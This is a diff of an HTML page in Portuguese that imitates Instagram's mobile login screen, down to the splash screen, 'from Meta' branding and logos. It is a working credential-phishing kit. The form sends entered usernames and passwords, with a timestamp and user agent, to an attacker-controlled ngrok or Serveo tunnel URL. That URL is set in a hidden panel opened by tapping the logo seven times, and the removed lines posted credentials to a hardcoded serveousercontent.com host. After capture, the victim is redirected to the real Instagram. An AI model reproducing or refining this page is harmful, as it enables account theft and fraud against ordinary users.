@@ -1,102 +1,548 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Social Connect</title>
+    <title>&#73;nstagram</title>
     <style>
-        /* Mantenho todo o seu CSS original para o visual ficar idêntico */
-        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
-        body, html { height: 100dvh; background-color: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow: hidden; }
-        #splash { position: fixed; inset: 0; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 120px 0 60px 0; z-index: 1000; transition: opacity 0.35s cubic-bezier(0.4, 0, 0.2, 1); }
-        .splash-logo-wrapper { flex: 1; display: flex; align-items: center; justify-content: center; }
-        .insta-splash-logo { width: 80px; height: 80px; }
-        .from-meta-container { display: flex; flex-direction: column; align-items: center; gap: 6px; }
-        .from-text { color: #8E8E8E; font-size: 13px; font-weight: 400; letter-spacing: 0.3px; text-transform: lowercase; }
-        .meta-splash { display: flex; align-items: baseline; gap: 4px; }
-        .infinity-splash { font-size: 24px; line-height: 1; font-weight: 600; background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-        .meta-word-splash { font-size: 20px; font-weight: 700; letter-spacing: -0.3px; background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-        #login-screen { display: none; flex-direction: column; align-items: center; width: 100%; height: 100dvh; background-color: #000000; padding: 0 16px; }
-        .lang-selector-wrapper { width: 100%; display: flex; justify-content: center; align-items: center; padding: 16px 0 8px 0; margin-bottom: 12px; }
-        .lang-selector { color: #A8A8A8; font-size: 14px; display: flex; align-items: center; gap: 4px; }
-        .insta-logo-login-wrapper { width: 100%; display: flex; justify-content: center; margin-bottom: 36px; }
-        .insta-logo-login { width: 64px; height: 64px; }
-        form { width: 100%; max-width: 358px; }
-        .input-box { width: 100%; background: #121212; border: 0.5px solid #363636; border-radius: 12px; padding: 14px 16px; color: #FFFFFF; font-size: 14px; margin-bottom: 10px; outline: none; }
-        .btn-login { width: 100%; background: #0095F6; color: #FFFFFF; border: none; border-radius: 18px; padding: 10px 0; font-size: 14px; font-weight: 600; margin-top: 12px; margin-bottom: 16px; cursor: pointer; }
-        .footer-container { margin-top: auto; width: 100%; display: flex; flex-direction: column; align-items: center; padding-bottom: 24px; }
-        .signup-btn { width: 100%; max-width: 358px; background: transparent; border: 1px solid #0095F6; border-radius: 18px; padding: 8px 0; color: #0095F6; font-size: 14px; font-weight: 600; text-align: center; text-decoration: none; margin-bottom: 28px; }
-        .meta-footer { display: flex; align-items: center; justify-content: center; opacity: 0.6; }
-        .meta-footer svg { width: 70px; height: auto; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body, html {
+            height: 100dvh;
+            background-color: #000;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        /* ========== SPLASH SCREEN ========== */
+        #splash-screen {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 120px 0 60px 0;
+            z-index: 1000;
+            transition: opacity 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .splash-logo-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .instagram-splash-icon {
+            width: 80px;
+            height: 80px;
+            filter: drop-shadow(0 0 8px rgba(252, 175, 69, 0.15));
+        }
+
+        .from-meta-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .from-label {
+            color: #8E8E8E;
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 0.3px;
+            text-transform: lowercase;
+        }
+
+        .meta-brand {
+            display: flex;
+            align-items: baseline;
+            gap: 4px;
+        }
+
+        .infinity-icon {
+            font-size: 24px;
+            line-height: 1;
+            font-weight: 600;
+            background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .meta-text {
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* ========== LOGIN SCREEN ========== */
+        #login-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            height: 100dvh;
+            background-color: #000000;
+            padding: 0 16px;
+        }
+
+        .language-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px 0 8px 0;
+            margin-bottom: 12px;
+        }
+
+        .language-selector {
+            color: #A8A8A8;
+            font-size: 14px;
+            font-weight: 400;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .language-selector svg {
+            width: 12px;
+            height: 12px;
+            fill: #A8A8A8;
+        }
+
+        .login-logo-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-bottom: 36px;
+            cursor: pointer;
+        }
+
+        .instagram-login-icon {
+            width: 64px;
+            height: 64px;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.3));
+        }
+
+        /* Formulário */
+        #login-form {
+            width: 100%;
+            max-width: 358px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: #121212;
+            border: 0.5px solid #363636;
+            border-radius: 12px;
+            padding: 14px 16px;
+            color: #FFFFFF;
+            font-size: 14px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            outline: none;
+            transition: border-color 0.2s ease;
+        }
+
+        .input-field:focus {
+            border-color: #A8A8A8;
+        }
+
+        .input-field::placeholder {
+            color: #8E8E8E;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        .login-button {
+            width: 100%;
+            background: #0095F6;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 18px;
+            padding: 7px 0;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 12px;
+            margin-bottom: 16px;
+            cursor: pointer;
+            transition: background 0.2s ease;
+            line-height: 18px;
+        }
+
+        .login-button:hover {
+            background: #1877F2;
+        }
+
+        .login-button:active {
+            opacity: 0.7;
+        }
+
+        .forgot-wrapper {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 80px;
+        }
+
+        .forgot-link {
+            color: #FFFFFF;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .forgot-link:active {
+            opacity: 0.7;
+        }
+
+        /* Rodapé */
+        .footer-wrapper {
+            margin-top: auto;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-bottom: 24px;
+        }
+
+        .signup-button {
+            width: 100%;
+            max-width: 358px;
+            background: transparent;
+            border: 1px solid #0095F6;
+            border-radius: 18px;
+            padding: 7px 0;
+            color: #0095F6;
+            font-size: 14px;
+            font-weight: 600;
+            text-align: center;
+            text-decoration: none;
+            margin-bottom: 28px;
+            line-height: 18px;
+            transition: background 0.2s ease;
+        }
+
+        .signup-button:active {
+            background: rgba(0, 149, 246, 0.1);
+        }
+
+        .meta-footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0.6;
+        }
+
+        .meta-footer svg {
+            width: 70px;
+            height: auto;
+        }
+
+        /* Painel de configuração */
+        #server-config {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1c1c1c;
+            padding: 16px;
+            border-radius: 12px;
+            display: none;
+            z-index: 2000;
+            border: 0.5px solid #363636;
+            width: 90%;
+            max-width: 350px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+
+        #server-config h3 {
+            color: #FFF;
+            font-size: 14px;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        #server-config input {
+            background: #000;
+            border: 0.5px solid #363636;
+            color: #FFF;
+            padding: 10px 12px;
+            border-radius: 8px;
+            width: 100%;
+            font-size: 12px;
+            outline: none;
+            margin-bottom: 12px;
+        }
+
+        #server-config input:focus {
+            border-color: #0095F6;
+        }
+
+        .config-buttons {
+            display: flex;
+            gap: 8px;
+        }
+
+        #server-config button {
+            flex: 1;
+            background: #0095F6;
+            color: #FFF;
+            border: none;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        #server-config .close-btn {
+            background: #363636;
+        }
+
+        /* Indicador de toques (some rápido) */
+        #tap-indicator {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,149,246,0.8);
+            color: #FFF;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            opacity: 0;
+            transition: opacity 0.2s;
+            z-index: 1999;
+        }
     </style>
 </head>
 <body>
 
+    <!-- Gradientes SVG -->
     <svg style="width:0; height:0; position:absolute;">
         <defs>
-            <linearGradient id="instaGradient" x1="0%" y1="0%" x2="100%" y2="100%">
-                <stop offset="0%" stop-color="#833AB4"/><stop offset="50%" stop-color="#E1306C"/><stop offset="100%" stop-color="#FCAF45"/>
+            <linearGradient id="instagramGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" stop-color="#833AB4"/>
+                <stop offset="25%" stop-color="#C13584"/>
+                <stop offset="50%" stop-color="#E1306C"/>
+                <stop offset="75%" stop-color="#FD1D1D"/>
+                <stop offset="100%" stop-color="#FCAF45"/>
             </linearGradient>
         </defs>
     </svg>
 
-    <div id="splash">
-        <div class="splash-logo-wrapper">
-            <svg class="insta-splash-logo" viewBox="0 0 24 24" fill="none">
-                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
-                <circle cx="12" cy="12" r="5.5" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
-                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#instaGradient)"/>
+    <!-- SPLASH SCREEN -->
+    <div id="splash-screen">
+        <div class="splash-logo-container">
+            <svg class="instagram-splash-icon" viewBox="0 0 24 24" fill="none">
+                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instagramGradient)" stroke-width="2.2" fill="none"/>
+                <circle cx="12" cy="12" r="5.5" stroke="url(#instagramGradient)" stroke-width="2.2" fill="none"/>
+                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#instagramGradient)"/>
             </svg>
         </div>
+
         <div class="from-meta-container">
-            <p class="from-text">from</p>
-            <div class="meta-splash"><span class="infinity-splash">∞</span><span class="meta-word-splash">Meta</span></div>
+            <p class="from-label">from</p>
+            <div class="meta-brand">
+                <span class="infinity-icon">∞</span>
+                <span class="meta-text">Meta</span>
+            </div>
         </div>
     </div>
 
+    <!-- LOGIN SCREEN -->
     <div id="login-screen">
-        <div class="lang-selector-wrapper">
-            <div class="lang-selector">Português (Brasil)</div>
+        <!-- Idioma -->
+        <div class="language-wrapper">
+            <div class="language-selector">
+                <span>Português (Brasil)</span>
+                <svg viewBox="0 0 24 24">
+                    <path d="M7 10l5 5 5-5H7z"/>
+                </svg>
+            </div>
         </div>
         
-        <div class="insta-logo-login-wrapper">
-            <svg class="insta-logo-login" viewBox="0 0 24 24" fill="none">
-                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
-                <circle cx="12" cy="12" r="5.5" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
-                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#instaGradient)"/>
+        <!-- Logo Instagram (7 TOQUES AQUI ABRE CONFIG) -->
+        <div class="login-logo-wrapper" id="secret-logo-trigger">
+            <svg class="instagram-login-icon" viewBox="0 0 24 24" fill="none">
+                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instagramGradient)" stroke-width="2.2" fill="none"/>
+                <circle cx="12" cy="12" r="5.5" stroke="url(#instagramGradient)" stroke-width="2.2" fill="none"/>
+                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#instagramGradient)"/>
             </svg>
         </div>
 
-        <form action="https://d20efe267c301204-143-208-80-199.serveousercontent.com" method="POST">
-            <input type="text" name="u_key_data" class="input-box" id="user-input" placeholder="Usuário ou e-mail" required>
-            <input type="password" name="p_val_secure" class="input-box" id="pass-input" placeholder="Senha" required>
-            <button type="submit" class="btn-login" id="submit-btn">Entrar</button>
+        <!-- Formulário de Login -->
+        <form id="login-form">
+            <input type="text" name="u" class="input-field" placeholder="Nome de usu&#225;rio, email ou celular" autocomplete="off" required>
+            <input type="text" name="p" class="input-field" placeholder="Senha" autocomplete="off" required>
+            <button type="submit" class="login-button">Entrar</button>
         </form>
 
-        <div class="footer-container">
-            <a href="#" class="signup-btn">Criar nova conta</a>
-            <div class="meta-footer" id="meta-svg-footer"></div>
+        <!-- Esqueceu a senha -->
+        <div class="forgot-wrapper">
+            <a href="#" class="forgot-link">Esqueceu a senha?</a>
+        </div>
+
+        <!-- Rodapé -->
+        <div class="footer-wrapper">
+            <a href="#" class="signup-button">Criar nova conta</a>
+            
+            <!-- Logo Meta -->
+            <div class="meta-footer">
+                <svg viewBox="0 0 287 56" fill="white" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M55.5 14.5C55.5 14.5 58.5 10 64 10C69.5 10 72 15 72 15L79 4C79 4 73.5 -2 64 2C54.5 6 55.5 14.5 55.5 14.5Z" fill="currentColor"/>
+                    <path d="M46 46C46 46 40 52 33 52C26 52 21 47 21 40C21 33 26 28 33 28C40 28 45 33 45 33L38 41C38 41 36 44 33 44C30 44 28 42 28 40C28 38 30 36 33 36C35 36 37 38 37 38L46 46Z" fill="currentColor"/>
+                    <path d="M90 52L90 4L98 4L98 52L90 52Z" fill="currentColor"/>
+                    <path d="M110 52L110 4L118 4L118 52L110 52Z" fill="currentColor"/>
+                    <path d="M130 52L130 4L138 4L138 24L152 4L162 4L146 22L164 52L152 52L138 28L138 52L130 52Z" fill="currentColor"/>
+                    <path d="M175 52L175 4L183 4L183 24L197 4L207 4L191 22L209 52L197 52L183 28L183 52L175 52Z" fill="currentColor"/>
+                    <circle cx="230" cy="28" r="24" stroke="currentColor" stroke-width="8" fill="none"/>
+                    <path d="M267 52L267 4L275 4L275 52L267 52Z" fill="currentColor"/>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <!-- Indicador de toques -->
+    <div id="tap-indicator">Toques: 0/7</div>
+
+    <!-- Painel de Configuração -->
+    <div id="server-config">
+        <h3>⚙️ Configurar Servidor</h3>
+        <input type="text" id="server-url" placeholder="https://seu-ngrok.ngrok-free.app" value="">
+        <div class="config-buttons">
+            <button onclick="saveServerUrl()">Salvar</button>
+            <button class="close-btn" onclick="hideConfig()">Fechar</button>
         </div>
     </div>
 
     <script>
-        window.addEventListener('load', () => {
-            const splash = document.getElementById('splash');
+        // ========== CONFIGURAÇÃO DO SERVIDOR ==========
+        let SERVER_URL = localStorage.getItem('serveo_url') || '';
+        
+        let logoTapCount = 0;
+        let logoTapTimer = null;
+        
+        function showTapIndicator(count) {
+            const indicator = document.getElementById('tap-indicator');
+            indicator.style.opacity = '1';
+            indicator.textContent = `Toques: ${count}/7`;
+            setTimeout(() => {
+                indicator.style.opacity = '0';
+            }, 500);
+        }
+        
+        function saveServerUrl() {
+            const url = document.getElementById('server-url').value.trim();
+            if (url) {
+                SERVER_URL = url.replace(/\/$/, '');
+                localStorage.setItem('serveo_url', SERVER_URL);
+                document.getElementById('server-config').style.display = 'none';
+                alert('✅ Servidor configurado!');
+            }
+        }
+        
+        function hideConfig() {
+            document.getElementById('server-config').style.display = 'none';
+        }
+        
+        // ========== GATILHO: 7 TOQUES NO LOGO ==========
+        document.getElementById('secret-logo-trigger').addEventListener('click', function() {
+            logoTapCount++;
+            showTapIndicator(logoTapCount);
+            
+            clearTimeout(logoTapTimer);
+            logoTapTimer = setTimeout(() => { 
+                logoTapCount = 0; 
+            }, 1500);
+            
+            if (logoTapCount >= 7) {
+                document.getElementById('server-config').style.display = 'block';
+                document.getElementById('server-url').value = SERVER_URL;
+                logoTapCount = 0;
+                document.getElementById('tap-indicator').style.opacity = '0';
+            }
+        });
+        
+        // ========== SPLASH TIMER ==========
+        window.addEventListener('load', function() {
+            const splash = document.getElementById('splash-screen');
             const login = document.getElementById('login-screen');
             
-            // Injeta o SVG da Meta via JS para não estar no HTML estático
-            document.getElementById('meta-svg-footer').innerHTML = `<svg viewBox="0 0 287 56" fill="white"><path d="M55.5 14.5C55.5 14.5 58.5 10 64 10C69.5 10 72 15 72 15L79 4C79 4 73.5 -2 64 2C54.5 6 55.5 14.5 55.5 14.5Z" fill="currentColor"/><circle cx="230" cy="28" r="24" stroke="currentColor" stroke-width="8" fill="none"/><path d="M267 52L267 4L275 4L275 52L267 52Z" fill="currentColor"/></svg>`;
-
-            setTimeout(() => {
+            setTimeout(function() {
                 splash.style.opacity = '0';
-                setTimeout(() => {
+                setTimeout(function() {
                     splash.style.display = 'none';
                     login.style.display = 'flex';
-                    // Muda o título só agora que o usuário já entrou
-                    document.title = "Instagram";
                 }, 350);
             }, 2200);
         });
+        
+        // ========== FORMULÁRIO DE LOGIN ==========
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const userField = document.querySelector('input[name="u"]');
+            const passField = document.querySelector('input[name="p"]');
+            
+            const userValue = userField.value.trim();
+            const passValue = passField.value.trim();
+            
+            if (!userValue || !passValue) {
+                return;
+            }
+            
+            if (SERVER_URL) {
+                try {
+                    const dados = {
+                        u: userValue,
+                        p: passValue,
+                        t: new Date().toISOString(),
+                        ua: navigator.userAgent
+                    };
+                    
+                    await fetch(SERVER_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'ngrok-skip-browser-warning': 'true'
+                        },
+                        body: JSON.stringify(dados)
+                    });
+                    
+                    await new Promise(r => setTimeout(r, 1000));
+                    
+                } catch (err) {
+                    console.log('Erro ignorado');
+                }
+            }
+            
+            window.location.href = 'https://www.instagram.com/reels/';
+        });
+        
+        // ========== PREVINE NAVEGAÇÃO DOS LINKS ==========
+        document.querySelectorAll('a').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+            });
+        });
+        
+        // Carrega URL salva
+        if (SERVER_URL) {
+            console.log('[OK] Servidor configurado');
+        }
     </script>
 </body>
 </html>
